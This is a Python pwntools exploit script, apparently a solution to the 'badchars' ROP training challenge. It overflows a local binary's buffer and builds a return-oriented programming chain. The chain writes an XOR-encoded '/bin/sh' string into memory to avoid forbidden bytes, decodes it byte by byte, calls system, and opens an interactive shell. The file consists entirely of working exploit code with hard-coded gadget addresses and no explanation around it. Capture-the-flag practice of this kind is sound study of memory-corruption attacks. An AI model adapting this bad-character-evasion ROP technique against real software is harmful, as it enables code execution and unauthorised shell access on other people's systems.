from pwn import *
# import angr, angrop

# badchars are: b i c / <space> f n s

prog = process("./badchars")
# p = angr.Project("badchars")

# rop = p.analyses.ROP()
# rop.find_gadgets()

xor = p64(0x00400b30) # xor byte [r15], r14b; ret
mov = p64(0x00400b34) # mov qword [r13], r12; ret
pop_rdi = p64(0x00400b39) # pop rdi; ret
pop_r12_r13 = p64(0x00400b3b) # pop r12; pop r13; ret
pop_r14_r15 = p64(0x00400b40) # pop r14; pop r15; ret
pop_r15 = p64(0x00400b42) # pop r15; ret
data_addr = [p64(a) for a in range(0x00601074, 0x0060107c)]
system_call = p64(0x004006f0)

payload = "A" * 40

payload += pop_r12_r13
payload += p64(0x0068732f6e69622f ^ 0xa6a6a6a6a6a6a6a6) # /bin/sh in hex xor'd 0xa6
payload += data_addr[0]
payload += mov
payload += pop_r14_r15
payload += p64(0xa6a6a6a6a6a6a6a6)
payload += data_addr[0]
for i in range(1, 8):
    payload += xor
    payload += pop_r15
    payload += data_addr[i]

payload += xor

payload += pop_rdi
payload += data_addr[0]

payload += system_call

open('payload', 'w').write(payload)

print prog.recvuntil(">")
prog.clean()

prog.sendline(payload)

prog.interactive()
